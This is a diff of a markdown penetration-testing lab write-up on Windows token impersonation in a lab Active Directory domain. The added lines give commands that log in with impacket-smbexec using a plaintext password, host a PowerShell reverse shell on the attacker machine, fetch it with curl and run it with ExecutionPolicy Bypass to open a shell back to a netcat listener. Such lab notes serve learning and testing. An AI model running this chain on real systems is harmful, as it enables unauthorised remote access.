@@ -143,4 +143,23 @@ Created whenever logging into a machine or using Remote Desktop.
 ### Impersonation Token  
 "non-interactive" such as attaching a network drive or a domain logon script
 
-Since attaining a reverse shell back to our attacker machine to launch metasploit to conduct an 'incognito' is not working, we will attempt to manually exploit fcastles user login with smbexec and fetch a custon PowerShell Rev Shell.  
+#### 1.Gaining access
+Since attaining a reverse shell back to our attacker machine via metasploit to conduct an 'incognito' attack is not working, we will attempt to manually exploit fcastles user login with impacket-smbexec and fetch a custom PowerShell Rev Shell.  
+
+    impacket-smbexec MARVEL/fcastle:Password1@192.168.64.139
+
+    hosted custom PS reverse shell on attacker machine and launched a directory server,
+    home/kali/tempdeletelater# python -m SimpleHTTPServer
+
+    Run curl in semi-interactive smbexec shell
+    curl -o revshell.ps1 http://192.168.64.129:8000/revshell1.ps1
+
+![image](https://github.com/user-attachments/assets/52a5aa14-9941-4c14-a3a7-7be742573798)
+![image](https://github.com/user-attachments/assets/ce8c240c-98e5-4522-be1c-f64a2f21c9f5)
+
+    our revshell has succesfully made it over under revshell.ps1
+
+    Now in a separate terminal, we start NetCat and execute the .PS1 file in the semi-interactive instance.
+    C:\Windows\system32>powershell -ExecutionPolicy Bypass -File .\revshell.ps1 192.168.64.129 444
+![image](https://github.com/user-attachments/assets/31cc46ba-6c30-4a1e-9643-3b188f03836c)
+![image](https://github.com/user-attachments/assets/71eba421-2780-496f-be24-c27169cfea24)
